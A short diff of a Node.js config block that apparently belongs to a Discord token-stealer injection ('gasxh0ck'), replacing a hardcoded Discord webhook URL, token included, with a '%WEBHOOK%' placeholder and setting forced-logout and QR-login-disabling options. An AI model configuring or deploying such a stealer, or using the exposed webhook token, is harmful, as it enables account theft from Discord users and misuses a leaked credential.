@@ -13,7 +13,7 @@ const fs = require("fs");
 var config = {
     brand: "gasxh0ck",
 
-    webhook: "https://discord.com/api/webhooks/1158821486119895080/HFpW-NRa8-uPeIobOTJ1ueJlagrcEFbUH9YJJbnFw9RlK8FDvd5cQFo3SPTqIPOxmpoU",
+    webhook: "%WEBHOOK%",
 
     logout: true,
     disable_qr_code: true,
